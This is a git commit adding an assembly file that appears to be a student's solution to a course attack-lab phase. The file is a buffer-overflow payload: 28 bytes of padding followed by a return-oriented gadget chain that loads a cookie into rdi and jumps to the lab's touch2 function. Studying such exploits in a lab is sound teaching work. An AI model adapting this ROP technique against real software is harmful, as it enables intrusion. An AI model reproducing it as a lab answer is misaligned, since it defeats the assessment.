65f0d0d4e87097fb60ed85f8e8bfaf6c05ac798c
nakido <nakidosama@outlook.com>
2023-03-27 22:20:38 +0800

    .

---
+++ labs/3.target1/p4.asm
@@ -0,0 +1,18 @@
+bits 64
+
+; goal:
+;     mov edi, 59B997FAh
+;     push qword 4017ECh
+;     ret
+
+section shellcode start=0h vstart=5561DC78h
+shellcode_start:
+    times 28 db ' ' ; 0x0 is also valid in file input
+
+section ret_addr start=28h vstart=5561DC78h+28h
+ret_addr:
+    dq 4019ABh                  ; pop rax; nop; ret
+    dq 59B997FAh                ;
+    dq 4019A2h                  ; mov rdi, rax; ret
+    dq 4019ACh                  ; nop; ret
+    dq 4017ECh                  ; touch2
